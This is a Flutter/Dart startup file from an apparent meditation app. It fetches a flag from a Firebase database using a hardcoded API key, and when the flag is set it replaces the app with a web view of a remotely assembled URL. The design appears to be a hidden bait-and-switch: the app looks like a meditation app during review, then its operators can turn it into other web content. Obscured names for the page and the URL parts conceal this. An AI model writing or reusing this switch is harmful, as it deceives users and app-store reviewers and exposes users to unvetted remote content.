import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:meditation/logic/get_premium/fb_model.dart';
import 'package:meditation/logic/get_premium/get_prem_hive_repo.dart';
import 'package:meditation/logic/get_premium/prem_hive_model/prem_hive_model.dart';
import 'package:meditation/logic/uajds.dart';
import 'package:meditation/main.dart';

startLogic() async {
  final NewPosterModel? model = await GetPremHiveRepo().getData();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: EDjahPage(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://meditation-258-default-rtdb.firebaseio.com/premium.json?auth=AIzaSyD24P-ebB1eOd-43qHV04I0ZPb_8CPXJQE');
      final fBResponseModel = FBResponseModel.fromJson(result.data);
      await GetPremHiveRepo().setData(
        NewPosterModel(
          secondUrl: '${fBResponseModel.under3}${fBResponseModel.keep4}',
          isOpen: fBResponseModel.leadGo,
        ),
      );

      if (fBResponseModel.leadGo) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: EDjahPage(
              link: '${fBResponseModel.jackson1}${fBResponseModel.kind2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
